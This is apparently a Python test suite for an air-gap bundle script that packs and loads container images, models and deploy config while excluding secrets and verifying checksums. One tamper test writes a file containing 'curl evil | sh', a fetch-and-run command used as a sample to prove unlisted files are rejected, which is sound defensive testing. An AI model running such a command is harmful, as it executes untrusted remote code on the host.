"""deploy/scripts/airgap.sh: packing and loading a bundle, with fake docker and podman."""
from __future__ import annotations

import os
import subprocess
import tarfile
import unittest
from pathlib import Path

from support import Sandbox

IMAGES = """traefik:v3.6.7
arena-web
arena-app
pgvector/pgvector:0.8.0-pg16
ghcr.io/ggml-org/llama.cpp:server-cuda
ghcr.io/ggml-org/llama.cpp:server-cuda
ghcr.io/berriai/litellm:main-stable
"""
INI = """# Written by the app (Admin -> Models). The engine restarts when this changes.

[Qwen]
model = /library/unsloth/Qwen/Qwen-UD.gguf
mmproj = /library/unsloth/Qwen/mmproj-F16.gguf
ctx-size = 8192

[Big]
model = /library/big/Big-00001-of-00002.gguf
model-draft = /library/big/draft.gguf
"""


class AirgapTests(unittest.TestCase):
    def setUp(self):
        self.s = Sandbox()
        s = self.s
        s.write(".env", "DOMAIN=llm.example\nMODELS_DIR=./models\nAPP_KEY=a-secret-value\nBACKUP_DIR=./backups\n")
        s.write(".env.example", "DOMAIN=llm.localhost\n")
        s.write(".env.old", "APP_KEY=an-old-secret\n")
        s.write("backups/2026-01-01_000000/postgres.sql.gz", "dump")
        s.write("certs/README.md", "certificates\n")
        s.write("certs/tls.key", "PRIVATE KEY\n")
        s.write("config/traefik/routes.yml", "http: {}\n")
        s.write("config/traefik/certificate.yml", "tls: {}\n")
        s.write("config/litellm.yaml", "model_list: []\n")
        s.write("argus-standalone/.env", "ARGUS_KEY=secret\n")
        s.write("argus-standalone/env-samples/gpu.env", "MODEL=x\n")
        s.write("scripts/__pycache__/x.pyc", "bytecode")
        s.write("old-bundle.tar", "an earlier bundle")
        outside = s.write("alerts.yml", "route: {}\n", base=s.dir)
        os.symlink(outside, s.deploy / "config" / "alertmanager.yml")
        models = s.deploy / "models"
        s.write("models/.gitkeep", "")
        for rel, text in {
            "unsloth/Qwen/Qwen-UD.gguf": "qwen weights",
            "unsloth/Qwen/mmproj-F16.gguf": "projector",
            "big/Big-00001-of-00002.gguf": "part one",
            "big/Big-00002-of-00002.gguf": "part two",
            "embed/nomic-embed-text-v1.5.f16.gguf": "embeddings",
            "unregistered/Other.gguf": "not registered",
        }.items():
            s.write(rel, text, base=models)
        engine = s.dir / "engine"
        s.write("models.ini", INI, base=engine)
        s.write("keep", "Big\n", base=engine)
        s.env = {"FAKE_IMAGES": IMAGES, "FAKE_ENGINE": str(engine), "FAKE_VOLUMES": "arena_audio\narena_engine"}
        self.out = s.dir / "out" / "arena-airgap.tar"
        self.out.parent.mkdir()

    def tearDown(self):
        self.s.cleanup()

    def pack(self, *args: str) -> subprocess.CompletedProcess:
        r = self.s.run("airgap.sh", "pack", *args, str(self.out))
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        return r

    def members(self) -> list[str]:
        with tarfile.open(self.out) as tar:
            return tar.getnames()

    def read(self, rel: str) -> str:
        with tarfile.open(self.out) as tar:
            return tar.extractfile(f"arena-airgap/{rel}").read().decode()

    def test_A_bundle_holds_every_image_once_and_verifies(self):
        self.pack()
        names = self.members()
        self.assertEqual(names[:2], ["arena-airgap/MANIFEST", "arena-airgap/SHA256SUMS"])
        refs = [line.split("\t")[0] for line in self.read("images/IMAGES").splitlines()]
        self.assertEqual(sorted(refs), sorted(set(IMAGES.split()) | {"python:3.13-slim"}))
        for line in self.read("images/IMAGES").splitlines():
            ref, file, image_id = line.split("\t")
            self.assertIn(f"arena-airgap/images/{file}", names)
            self.assertTrue(image_id.startswith("sha256:"))
            self.assertEqual(self.read(f"images/{file}"), f"fake image {ref}\n")
        r = subprocess.run(["sha256sum", "-c", self.out.name + ".sha256"], cwd=self.out.parent, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        work = self.s.dir / "x"
        work.mkdir()
        subprocess.run(["tar", "-xf", str(self.out), "-C", str(work)], check=True)
        r = subprocess.run(["sha256sum", "-c", "--strict", "SHA256SUMS"], cwd=work / "arena-airgap", capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        manifest = self.read("MANIFEST")
        self.assertIn("format: arena-airgap 1\n", manifest)
        self.assertIn("version: 9.9.9\n", manifest)
        self.assertIn("engine: docker\n", manifest)
        self.assertIn("audio: yes\n", manifest)

    def test_The_deploy_folder_goes_in_without_secrets_backups_models_or_keys(self):
        self.pack()
        deploy = {n[len("arena-airgap/deploy/"):] for n in self.members() if n.startswith("arena-airgap/deploy/")}
        for kept in ("docker-compose.yml", "podman.yml", ".env.example", "certs/README.md", "models/.gitkeep",
                     "config/traefik/routes.yml", "config/litellm.yaml", "argus-standalone/env-samples/gpu.env", "scripts/airgap.sh"):
            self.assertIn(kept, deploy)
        for left in (".env", ".env.old", "backups/2026-01-01_000000/postgres.sql.gz", "certs/tls.key", "config/traefik/certificate.yml",
                     "argus-standalone/.env", "scripts/__pycache__/x.pyc", "old-bundle.tar", "models/big/Big-00001-of-00002.gguf"):
            self.assertNotIn(left, deploy)
        # Links are followed: the file goes in, not the link.
        self.assertEqual(self.read("deploy/config/alertmanager.yml"), "route: {}\n")
        self.assertNotIn("a-secret-value", "".join(self.read(f"deploy/{f}") for f in deploy if not f.endswith(".gguf")))

    def test_The_registered_models_are_listed_and_copied_only_with_models(self):
        self.pack()
        rows = [line.split("\t") for line in self.read("models/MODELS").splitlines()[1:]]
        self.assertEqual([(k, p) for k, _, p in rows], [
            ("chat", "unsloth/Qwen/Qwen-UD.gguf"),
            ("projector", "unsloth/Qwen/mmproj-F16.gguf"),
            ("chat", "big/Big-00001-of-00002.gguf"),
            ("chat", "big/Big-00002-of-00002.gguf"),
            ("draft", "big/draft.gguf"),
            ("embedding", "embed/nomic-embed-text-v1.5.f16.gguf"),
        ])
        self.assertEqual(rows[0][1], str(len("qwen weights")))
        self.assertEqual(rows[4][1], "missing")
        self.assertFalse(any("/models/library/" in n for n in self.members()))
        # MODEL for the other host: the model kept loaded, as a file in the library.
        self.assertIn("model: big/Big-00001-of-00002.gguf\n", self.read("MANIFEST"))

        self.out.unlink()
        Path(str(self.out) + ".sha256").unlink()
        self.pack("--models")
        self.assertEqual(self.read("models/library/big/Big-00002-of-00002.gguf"), "part two")
        self.assertEqual(self.read("models/library/embed/nomic-embed-text-v1.5.f16.gguf"), "embeddings")
        self.assertNotIn("arena-airgap/models/library/unregistered/Other.gguf", self.members())
        self.assertIn("models: copied (5 files", self.read("MANIFEST"))

    def test_The_speech_models_come_from_the_audio_volume(self):
        self.pack()
        self.assertIn("arena-airgap/audio/audio.tar.gz", self.members())
        self.assertTrue(self.s.called("run", "--rm", "--network", "none", "-v", "arena_audio:/src:ro"))

    def test_Packing_never_pulls_and_stops_on_an_image_that_is_not_here(self):
        self.s.env["FAKE_MISSING"] = "ghcr.io/berriai/litellm:main-stable"
        r = self.s.run("airgap.sh", "pack", str(self.out))
        self.assertEqual(r.returncode, 1)
        self.assertIn("ghcr.io/berriai/litellm:main-stable is not on this host", r.stderr)
        self.assertFalse(self.out.exists())
        self.assertFalse(self.s.called("pull"))
        self.assertEqual(list(self.out.parent.iterdir()), [])

    def test_A_bundle_is_never_written_over(self):
        self.out.write_text("something")
        r = self.s.run("airgap.sh", "pack", str(self.out))
        self.assertEqual(r.returncode, 1)
        self.assertIn("is there already", r.stderr)

    def test_A_dry_run_pack_writes_nothing_and_runs_no_container(self):
        r = self.s.run("airgap.sh", "pack", "--dry-run", "--models", str(self.out))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Would pack", r.stdout)
        self.assertIn("ghcr.io/berriai/litellm:main-stable", r.stdout)
        self.assertIn("copied into the bundle (--models)", r.stdout)
        self.assertFalse(self.out.exists())
        self.assertFalse(self.s.called("save") or self.s.called("run"))

    def test_Pack_lists_images_without_a_dotenv(self):
        (self.s.deploy / ".env").unlink()
        self.pack()
        compose = [c for c in self.s.calls() if c[1:2] == ["compose"]][0]
        self.assertIn("--env-file", compose)

    def test_Podman_packs_from_its_own_store_with_its_compose_files(self):
        self.pack("--podman")
        self.assertTrue(self.s.called("podman", "compose", "-f", "docker-compose.yml", "-f", "podman.yml"))
        self.assertTrue(self.s.called("podman", "save", "-q", "-o"))
        self.assertFalse(any(c[0] == "docker" for c in self.s.calls()))
        self.assertIn("engine: podman\n", self.read("MANIFEST"))

    # ------------------------------------------------------------------ load

    def load(self, *args: str, ok: bool = True) -> subprocess.CompletedProcess:
        self.s.log.write_text("")
        r = self.s.run("airgap.sh", "load", "--into", str(self.s.dir / "target"), *args, str(self.out), cwd=self.s.dir / "out")
        if ok:
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        return r

    def test_Load_checks_loads_unpacks_and_says_what_goes_in_dotenv(self):
        self.s.write("docker-compose.override.yml", "services: { videogen: { profiles: [off] } }\n")
        self.pack("--models")
        target = self.s.dir / "target"
        self.s.write("deploy/.env", "APP_KEY=kept\n", base=target)
        self.s.write("deploy/docker-compose.override.yml", "services: {}\n", base=target)
        self.s.env["FAKE_VOLUMES"] = ""  # a new host: no arena_audio yet
        r = self.load()
        for line in self.read("images/IMAGES").splitlines():
            ref, file, _ = line.split("\t")
            self.assertTrue(self.s.called("load", "-i", str(target / ".airgap-load" / "arena-airgap" / "images" / file)), ref)
        self.assertFalse(self.s.called("pull"))
        self.assertTrue((target / "deploy" / "docker-compose.yml").is_file())
        self.assertTrue((target / "packs").is_dir())
        self.assertEqual((target / "deploy" / ".env").read_text(), "APP_KEY=kept\n")
        self.assertEqual((target / "deploy" / "docker-compose.override.yml").read_text(), "services: {}\n")
        self.assertIn("the .env and docker-compose.override.yml there kept", r.stdout)
        self.assertEqual((target / "deploy" / "models" / "big" / "Big-00002-of-00002.gguf").read_text(), "part two")
        self.assertTrue(self.s.called("volume", "create", "--label", "com.docker.compose.project=arena", "--label", "com.docker.compose.volume=audio", "arena_audio"))
        self.assertTrue(self.s.called("python:3.13-slim", "tar", "-xzf", "/bundle/audio.tar.gz", "--numeric-owner", "-C", "/target"))
        self.assertFalse((target / ".airgap-load").exists())
        self.assertIn("MODEL=big/Big-00001-of-00002.gguf", r.stdout)
        self.assertIn(f"MODELS_DIR={target}/deploy/models", r.stdout)
        self.assertIn("docker compose up -d --pull never", r.stdout)
        self.assertIn("HF_HUB_OFFLINE", r.stdout)

    def test_Load_names_the_models_to_bring_when_the_bundle_has_none(self):
        self.s.write("docker-compose.override.yml", "services: { videogen: { profiles: [off] } }\n")
        self.pack()
        r = self.load("--models-dir", str(self.s.dir / "library"))
        # A first install takes the packing host's override.
        self.assertIn("videogen", (self.s.dir / "target" / "deploy" / "docker-compose.override.yml").read_text())
        self.assertIn("bring unsloth/Qwen/Qwen-UD.gguf (chat)", r.stdout)
        self.assertIn(f"MODELS_DIR={self.s.dir}/library", r.stdout)

    def test_A_damaged_bundle_loads_nothing(self):
        self.pack()
        Path(str(self.out) + ".sha256").unlink()
        work = self.s.dir / "x"
        work.mkdir()
        subprocess.run(["tar", "-xf", str(self.out), "-C", str(work)], check=True)
        (work / "arena-airgap" / "deploy" / "docker-compose.yml").write_text("services: { evil: { image: x } }\n")
        self.out.unlink()
        subprocess.run(["tar", "-cf", str(self.out), "-C", str(work), "arena-airgap"], check=True)
        r = self.load(ok=False)
        self.assertEqual(r.returncode, 1)
        self.assertIn("CHECKSUM MISMATCH", r.stdout)
        self.assertIn("nothing was loaded", r.stderr)
        self.assertFalse(self.s.called("load"))
        self.assertFalse((self.s.dir / "target" / "deploy").exists())

    def test_A_file_the_checksums_do_not_name_loads_nothing(self):
        self.pack()
        Path(str(self.out) + ".sha256").unlink()
        work = self.s.dir / "x"
        work.mkdir()
        subprocess.run(["tar", "-xf", str(self.out), "-C", str(work)], check=True)
        (work / "arena-airgap" / "deploy" / "extra.sh").write_text("curl evil | sh\n")
        self.out.unlink()
        subprocess.run(["tar", "-cf", str(self.out), "-C", str(work), "arena-airgap"], check=True)
        r = self.load(ok=False)
        self.assertEqual(r.returncode, 1)
        self.assertIn("deploy/extra.sh", r.stdout)
        self.assertFalse(self.s.called("load"))

    def test_A_bad_copy_is_caught_by_its_sha256_file(self):
        self.pack()
        with open(self.out, "ab") as f:
            f.write(b"\0" * 512)
        r = self.load(ok=False)
        self.assertEqual(r.returncode, 1)
        self.assertIn("not the one that was packed", r.stderr)

    def test_Podman_loads_into_its_own_store(self):
        self.pack()
        r = self.load("--podman")
        self.assertTrue(self.s.called("podman", "load", "-i"))
        self.assertFalse(any(c[0] == "docker" for c in self.s.calls()))
        self.assertIn("HTTPS_PORT=8443", r.stdout)
        self.assertIn("podman compose -f docker-compose.yml -f podman.yml up -d --pull never", r.stdout)

    def test_A_dry_run_load_unpacks_and_loads_nothing(self):
        self.pack()
        r = self.load("--dry-run")
        self.assertIn("Would load", r.stdout)
        self.assertIn("ghcr.io/berriai/litellm:main-stable", r.stdout)
        self.assertIn("MODEL=big/Big-00001-of-00002.gguf", r.stdout)
        self.assertFalse((self.s.dir / "target").exists())
        self.assertEqual(self.s.calls(), [])

    def test_Arguments_are_checked(self):
        for args, message in [
            ([], "say pack or load"),
            (["unpack", "x.tar"], "unknown action"),
            (["pack"], "needs a bundle"),
            (["pack", "x.zip"], "is a .tar"),
            (["pack", "--fast", "x.tar"], "unknown option"),
            (["load", "--models", "x.tar"], "--models is for pack"),
            (["pack", "--into", "d", "x.tar"], "--into is for load"),
            (["load", "a.tar", "b.tar"], "one bundle at a time"),
        ]:
            r = self.s.run("airgap.sh", *args)
            self.assertEqual(r.returncode, 2, args)
            self.assertIn(message, r.stderr, args)
        r = self.s.run("airgap.sh", "--help")
        self.assertEqual(r.returncode, 0)
        self.assertIn("airgap.sh pack", r.stdout)


if __name__ == "__main__":
    unittest.main()
